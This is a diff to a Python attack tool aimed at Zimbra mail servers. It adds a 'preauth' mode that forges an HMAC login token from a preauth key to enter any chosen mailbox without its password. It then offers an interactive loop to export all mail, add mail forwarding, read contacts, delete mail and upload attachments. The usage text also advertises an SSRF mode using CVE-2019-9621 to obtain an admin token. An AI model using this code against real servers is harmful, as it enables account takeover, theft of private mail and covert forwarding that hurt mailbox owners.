@@ -6,10 +6,56 @@ from requests_toolbelt import MultipartEncoder
 import warnings
 warnings.filterwarnings("ignore")
 from datetime import datetime
+import hmac, hashlib
+from time import time
 
 headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
 }
+
+def generate_preauth(target, mailbox, preauth_key):
+    try:
+        preauth_url = target + "/service/preauth"
+        timestamp = int(time()*1000)
+        data = "{mailbox}|name|0|{timestamp}".format(mailbox=mailbox, timestamp=timestamp)
+        pak = hmac.new(preauth_key.encode(), data.encode(), hashlib.sha1).hexdigest()
+        print("[+] Preauth url: ")   
+        print("%s?account=%s&expires=0&timestamp=%s&preauth=%s"%(preauth_url, mailbox, timestamp, pak))
+        return timestamp, pak
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def auth_request_preauth(uri,username,timestamp,pak):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">              
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <AuthRequest xmlns="urn:zimbraAccount">
+            <account>{username}</account>
+            <preauth timestamp="{timestamp}" expires="0">{pak}</preauth>
+         </AuthRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+    try:
+        r=requests.post(uri+"/service/soap",headers=headers,data=request_body.format(username=username,timestamp=timestamp,pak=pak),verify=False,timeout=15)
+        if 'authentication failed' in r.text:
+            print("[-] Authentication failed for %s"%(username))
+            exit(0)
+        elif 'authToken' in r.text:
+            pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")
+            token = pattern_auth_token.findall(r.text)[0]
+            print("[+] Authentication success for %s"%(username))
+            print("[*] authToken_low:%s"%(token))
+            return token
+        else:
+            print("[!]")
+            print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+        exit(0) 
 
 def auth_request_low(uri,username,password):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -2222,12 +2268,72 @@ if __name__ == '__main__':
         print("      low       auth for low token")   
         print("      admin     auth for admin token")
         print("      ssrf      Use CVE-2019-9621 to get the admin token")
+        print("      preauth   Use preauth key to login")
         print("Eg:")
         print("      %s https://192.168.1.1 user1@mail.zimbra password low"%(sys.argv[0]))
-        print("      %s https://192.168.1.1 zimbra password ssrf"%(sys.argv[0]))    
+        print("      %s https://192.168.1.1 zimbra password ssrf"%(sys.argv[0]))
+        print("      %s https://192.168.1.1 user1@mail.zimbra 1111111111111111111111111111111111111111111111111111111111111111 preauth"%(sys.argv[0])) 
+        
         sys.exit(0)
     else:
-        if sys.argv[4]=='low':
+        if sys.argv[4]=='preauth':
+            print("[*] Try to preauth for low token")
+            timestamp, pak = generate_preauth(sys.argv[1],sys.argv[2],sys.argv[3])
+            low_token = auth_request_preauth(sys.argv[1],sys.argv[2],timestamp,pak) 
+            print("[*] Command Mode")
+            usage_low()
+            while(1):
+                cmd = input("[$] ")
+                if cmd=='help':
+                    usage_low()
+                elif cmd=='AddForward':    
+                    addforward_request(sys.argv[1],low_token)                   
+                elif cmd=='AddShare':    
+                    addshare_request(sys.argv[1],low_token)
+                elif cmd=='DeleteMail':    
+                    deletemail_request(sys.argv[1],low_token)
+                elif cmd=='ExportMail':    
+                    exportmail_request(sys.argv[1],low_token,sys.argv[2])
+                elif cmd=='ExportMailAll':    
+                    exportmailall_request(sys.argv[1],low_token,sys.argv[2])                   
+                elif cmd=='GetAllAddressLists':
+                    getalladdresslists_request(sys.argv[1],low_token)
+                elif cmd=='GetContacts':
+                    getcontacts_request(sys.argv[1],low_token,sys.argv[2])
+                elif cmd=='GetForward':
+                    getforward_request(sys.argv[1],low_token)                    
+                elif 'GetItem' in cmd:
+                    cmdlist = cmd.split(' ')
+                    getitem_request(sys.argv[1],low_token,cmdlist[1])
+                elif 'GetMsg' in cmd:
+                    cmdlist = cmd.split(' ')
+                    getmsg_request(sys.argv[1],low_token,cmdlist[1])
+                elif cmd=='GetShare':
+                    getshare_request(sys.argv[1],low_token)                    
+                elif cmd=='listallfoldersize':
+                    getfolder_request(sys.argv[1],low_token)
+                elif cmd=='RemoveForward':    
+                    removeforward_request(sys.argv[1],low_token)                                      
+                elif cmd=='RemoveShare':    
+                    removeshare_request(sys.argv[1],low_token)                
+                elif cmd=='SearchMail':    
+                    searchmail_request(sys.argv[1],low_token)
+                elif cmd=='SendShareNotification':    
+                    sendsharenotification_request(sys.argv[1],low_token)               
+                elif cmd=='SendTestMailToSelf':    
+                    sendtestmailtoself_request(sys.argv[1],low_token,sys.argv[2])
+                elif cmd=='uploadattachment':    
+                    uploadattachment_request(sys.argv[1],low_token)
+                elif cmd=='uploadattachmentraw':    
+                    uploadattachmentraw_request(sys.argv[1],low_token)
+                elif cmd=='viewmail':    
+                    viewmail_request(sys.argv[1],low_token)
+                elif cmd=='exit':
+                    exit(0)
+                else:
+                    print("[!] Wrong parameter")
+        
+        elif sys.argv[4]=='low':
             print("[*] Try to auth for low token")
             low_token = auth_request_low(sys.argv[1],sys.argv[2],sys.argv[3]) 
             print("[*] Command Mode")
